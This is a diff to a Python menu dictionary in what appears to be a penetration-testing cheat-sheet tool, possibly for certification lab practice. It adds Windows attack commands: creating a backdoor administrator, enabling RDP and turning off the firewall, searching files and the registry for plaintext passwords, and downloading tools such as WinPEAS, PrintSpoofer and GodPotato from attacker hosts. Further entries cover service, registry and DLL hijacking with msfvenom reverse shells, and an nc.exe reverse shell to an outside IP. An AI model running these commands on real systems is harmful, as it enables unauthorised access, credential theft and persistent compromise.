@@ -830,8 +830,17 @@ menu_structure = {
                         ("ls \\\\web04\\backup", "Now you have access to the previously restricted share")
                     ],
                 }
-                    ],
-            },
+            ],
+            "Adding backdoor user": 
+            [   
+                ("net user /add backdoor Password123","Creating user"),
+                ("net localgroup administrators /add backdoor","Adding user to administrators"),
+                ("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0 /f","Enabling RDP"),
+                ("netsh advfirewall set allprofiles state off","Switching off protections"),
+                ("xfreerdp /v:192.168.1.1 /u:backdoor /d:ms01 /p:Password123 +clipboard","Connecting"),
+                ("impacket-smbserver -smb2support stage .","Creating shares"),
+            ],
+        },
         "Persistence": 
             {
             "Golden ticket": 
@@ -872,13 +881,207 @@ menu_structure = {
     "Windows Privilege Escalation": 
     {
        
-        "Situational awareness": [],
-        "Hidden in plain view": [],
-        "Automated enumeration": [],
-        "Service exploits": [],
-        "Registry exploits": [],
-        "Scheduled tasks": [],
-        "Token impersonation": [],
+        "Situational awareness": 
+            [
+                    ("whoami /priv","Assigned tokens"),
+                    ("whoami /groups","In which group is the user"),
+                    ("net localgroup","What are local groups?"),
+                    ("Get-LocalGroup","What are local groups? (PS)"),
+                    ("net localgroup Administrators","Members of the particular group"),
+                    ("Get-LocalGroupMember Administrators","Members of the particular group (PS)"),
+                    ("systeminfo","System Information"),
+                    ("ipconfig /all","Information about network config"),
+                    ("route print","Routing table"),
+                    ("netstat -ano","Active network connections"),
+                    ("Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname","32-bit installed apps"),
+                    ("Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname","64-bit installed apps"),
+                    ("Get-ChildItem -Force | Get-Acl | Select-Object Path, Owner, AccessToString | Sort-Object Owner","Who is owning a file"),
+                    ("dir env:","Global environment variables"),
+                    ("Get-Process","List of processes"),
+                    ("Get-Service","List of services"),
+                    ("Start-Service <service>","Start service"),
+                    ("Stop-Service <service>","Stop service"),
+                    ("Restart-Service <service>","Restart service"),
+            ],
+        "Searching for plain text password": 
+        [   
+            {"Searching for kdbx file":
+                [
+                    ("Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Searching for password manager database"),
+                ],
+            },
+            {"Searching for sensitive info in XAMPP":
+                [
+                ("Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue","Searching for sensitive info in XAMPP"),
+                ],
+            },
+            {"Looking for passwords in files":
+                [
+                ("dir /s *pass* == *.txt","Putty keys"),
+                ("findstr /si password *.txt","Search for all .txt files recursively for word \"password\""),
+                ("findstr /si password *.xml","Search for all .xml files recursively for word \"password\""),
+                ("findstr /si password *.ini","Search for all .ini files recursively for word \"password\""),
+                ("findstr /si password *.config","Search for all .config files recursively for word \"password\""),
+                ],
+            },
+            {"Passwords in registry":
+                [
+                ("reg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"","Putty"),
+                ("reg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"","VNC"),
+                ("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"","Windows autologin"),
+                ("reg query HKLM /f password /t REG_SZ /s","Search for password in registry HKLM"),
+                ("reg query HKCU /f password /t REG_SZ /s","Search for password in registry HKCU"),
+                ],
+            },
+            {"Passwords in PowerShell history":
+                [
+                ("Get-History","History of commands"),
+                ("(Get-PSReadlineOption).HistorySavePath","Get the path of PSReadline"),
+                ("type C:\\Users\alice\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt","Read the PSReading file"),
+                ],
+            },
+        ],
+        "Automated enumeration": 
+        [
+            { "Winpeas":
+                [
+                ("iwr -uri http://192.168.45.2/winPEASx64.exe -Outfile winPEASx64.exe","Uploading WinPeas"),
+                (".\\winPEASx64","Running WinPeas"),
+                ],
+
+            },
+            { "PrivescCheck.ps1":
+                [
+                ("iwr -uri http://192.168.45.2/PrivescCheck.ps1 -Outfile PrivescCheck.ps1","Uploading PrivescCheck"),
+                (". .\\PrivescCheck.ps1; Invoke-PrivescCheck - Extended","Running PrivescCheck"),
+                ],
+            },
+        ],
+        "Service exploits": 
+        [
+            { "Useful commands":
+                [
+                ("sc query state= all","List all services"),
+                ("wmic service where \"StartName='LocalSystem'\" get Name,DisplayName,StartName,State","List services which run as LocalSystem"),
+                ("sc.exe qc <name>","Query the configuration of a service"),
+                ("sc.exe query <name>","Query the current status of a service"),
+                ("sc.exe config <name> <option>= <value>","Modify a configuration option of a service"),
+                ("net start <name>","Start a service"),
+                ("net stop <name>","Stop a service"),
+                ],
+            },
+            { "Insecure Service Properties":
+                [
+                (".\\accesschk.exe /accepteula -uwcqv alice some_service","Check that we can modify the service can (start/stop/change config)"),
+                ("sc qc some_service","Parameters of the service"),
+                ("sc query some_service","Status of the service"),
+                ("sc config some_service binpath= \"\"C:\\Users\\alice\\reverse.exe\\\"","Pointing binary of the service to reverse shell"),
+                ("net start daclsvc","Starting the service and getting reverse shell"),
+                ],
+            },
+            { "Unquoted Service Path":
+                [
+                (".\\accesschk.exe /accepteula -ucqv user some_service","Can we run service?"),
+                (".\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\"","Do we have write permissions for binary in proper path?"),
+                ("copy reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Program.exe\"","Copy executable and name it Program.exe"),
+                ("net start some_service","Start service and getting reverse shell"),
+                ],
+            },
+            { "Weak Registry Permissions":
+                [
+                ("Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\some_reg_service | Format-List","Checking ACL of registry entry"),
+                (".\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\some_reg_service","Accesschk to check registry permissions"),
+                (".\\accesschk.exe /accepteula -ucqv user regsvc","Let's see if we can start / stop service"),
+                ("reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\some_reg_service /v ImagePath /t REG_EXPAND_SZ /d C:\\Users\alice\reverse.exe /f","Over writing value with our reverse shell"),
+                ("net start regsvc","Starting service"),
+                ],
+            },
+            { "Service executables writable by everyone":
+                [
+                (".\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\some_service.exe\"","Veryfing permissions of binary by accessck"),
+                (".\accesschk.exe /accepteula -uvqc some_service","Veryfing if we can start / stop service"),
+                ("copy /Y C:\\Users\\alice\\reverse.exe \"C:\\Program Files\\some_service.exe\"","Copy and overwrite original executable"),
+                ("net start filepermservice.exe","Starting the service"),
+                ],
+            },
+            { "DLL Hijacking":
+                [
+                ("sc qc some_service","Information about the service"),
+                ("","Copying file some_service.exe for analysis using procmon64"),
+                ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f dll -o /hack.dll",""),
+                ("copy \\\\\192.168.1.1\\tools\\hijackme.dll C:\\Users\\Public\\","Copying dll file"),
+                ("net start some_service.exe","Starting the service")
+                ],
+            },
+
+        ],
+        "Registry exploits": 
+        [
+            {
+            "Autoruns":
+                [
+                ("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run","Manual inspection of autor run programs"),
+                (".\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\some_program.exe\"","Now for every program we need to verify permissions on executables"),
+                ("copy /y reverse.exe \"C:\\Program Files\\some_program.exe\"","Overwriting some_program.exe executable"),
+                ("shutdown /r /t 0","Restarting machine"),
+                ],
+
+            },
+            {
+            "AlwaysInstallElevated":
+                [
+                (".\\winPEASany.exe quiet windowscreds","Running winpeas with special command"),
+                ("reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","Manual verification"),
+                ("reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated","Manual verification"),
+                ("msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 -f msi -o reverse.msi","To exploit just create msi reverse shell"),
+                ("copy \\\\192.168.1.11\\reverse.msi .","Copy to machine"),
+                ("msiexec /quiet /qn /i reverse.msi","Exploit to get revere shell"),
+                ],
+
+            },
+        ],
+        "Scheduled tasks": 
+        [
+                
+                ("schtasks /query /fo LIST /v","List all scheduled tasks your user can see"),
+                ("Get-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | ft TaskName,TaskPath,State","List all scheduled tasks your user can see (PS)"),
+                ("C:\\Users\\Public\\accesschk.exe /accepteula -quv user some_script.ps1","Permissions on the file/script"),
+
+        ],
+        "Token impersonation": 
+        [
+            {
+                "PrintSpoofer (SeImpersonatePrivilege + Microsoft Windows Server 2019 Standard)":
+                [
+                ("iwr -uri http://192.168.45.180/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe","Download PrintSpoofer"),
+                (".\\PrintSpoofer64.exe -i -c powershell.exe","Running the exploit"),
+                ],
+            },
+            {
+                "GodPotato (SeImpersonatePrivilege + SeCreateGlobalPrivilege + SEchangeNotifyPrivilege)":
+                [
+                ("Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -Recurse","Check what .NET env it is (from JACKO machine). Based on it use proper GodPotato."),
+                ("iwr -uri http://192.168.45.157/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe","Upload GodPotato and run the reverse shell"),
+                (".\\GodPotato-NET4.exe -cmd \"C:\\Services\nc.exe -t -e C:\\Windows\\System32\\cmd.exe 192.168.45.169 80\"","Running the reverse shell"),
+                ],
+            },
+            {
+                "JuicyPotatoNG":
+                [
+                ("JuicyPotatoNG.exe -t * -p \"shell.exe\" -a","Running the reverse shell"),
+                ],
+            },
+            {
+                "Full Powers (When NT Authority\\service or NT Authority\\network)":
+                [
+                ("FullPowers.exe -x","Running the exploit (Used in Squid PG machine)"),
+                ("FullPowers.exe","Running the exploit (Used in Squid PG machine)"),
+                ],
+            },
+
+
+
+        ],
         "Adding backdoor user": [],
      
     },
